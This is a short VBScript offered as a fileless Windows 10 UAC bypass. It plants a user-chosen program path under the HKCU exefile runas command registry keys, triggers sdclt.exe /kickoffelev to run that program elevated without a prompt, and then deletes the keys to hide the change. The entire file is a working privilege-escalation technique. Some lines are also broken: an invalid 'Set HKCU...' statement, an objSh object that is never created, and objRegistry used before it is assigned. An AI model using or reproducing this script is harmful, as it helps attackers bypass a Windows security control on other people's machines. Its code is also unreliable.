
; enigma0x3 implementation in vbs...
; for a simple fileless UAC bypass supports all win 10 ver...

Const HKEY_CURRENT_USER = &H80000001
dim WshShell
dim dr,ex, objSh, ex2, strKeypath
dim fso
dim Directory, CurrentDirectory, Dr2
Set fso = CreateObject("Scripting.FileSystemObject")
CurrentDirectory = fso.GetAbsolutePathName(".")
Directory = "your software....."
Set HKCU\Software\Classes\exefile
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\Software\Classes\exefile\shell\runas\command\", Directory, "REG_SZ"
WshShell.RegWrite "HKCU\Software\Classes\exefile\shell\runas\command\isolatedCommand", Directory, "REG_SZ"
WshShell.RegWrite "HKCU\Software\Classes\exefile\shell\runas\command\(Default)", Directory, "REG_SZ"
WshShell.RegWrite "HKCU\Software\Classes\exefile\shell\runas\command\ ", Directory, "REG_SZ"
dr = "C:\windows\system32"
ex = "sdclt.exe /kickoffelev"
objSh.CurrentDirectory = dr
objSh.Run ex 

strComputer = "."
strKeyPath = "Software\Classes\exefile" 
DeleteSubkeys HKEY_CURRENT_USER, strKeypath
Set objRegistry = GetObject("winmgmts:\\" & _
    strComputer & "\root\default:StdRegProv") 

Sub DeleteSubkeys(HKEY_CURRENT_USER, strKeyPath) 
    objRegistry.EnumKey HKEY_CURRENT_USER, strKeyPath, arrSubkeys 

    If IsArray(arrSubkeys) Then 
        For Each strSubkey In arrSubkeys 
            DeleteSubkeys HKEY_CURRENT_USER, strKeyPath & "\" & strSubkey 
        Next 
    End If 

    objRegistry.DeleteKey HKEY_CURRENT_USER, strKeyPath 
End Sub



